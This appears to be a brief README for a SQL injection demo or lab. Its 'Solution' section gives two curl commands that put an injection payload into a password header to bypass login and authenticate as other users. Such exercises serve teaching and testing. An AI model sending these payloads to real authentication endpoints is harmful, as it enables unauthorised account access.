# sql-injection-demo

# Solution:

`curl {server ip}:8000/auth -H "username:viet009" -H "pw:' OR username='viet010' --'"`
`curl {server ip}:8000/auth -H "username:viet009" -H "pw:' OR username='viet020' --'"`
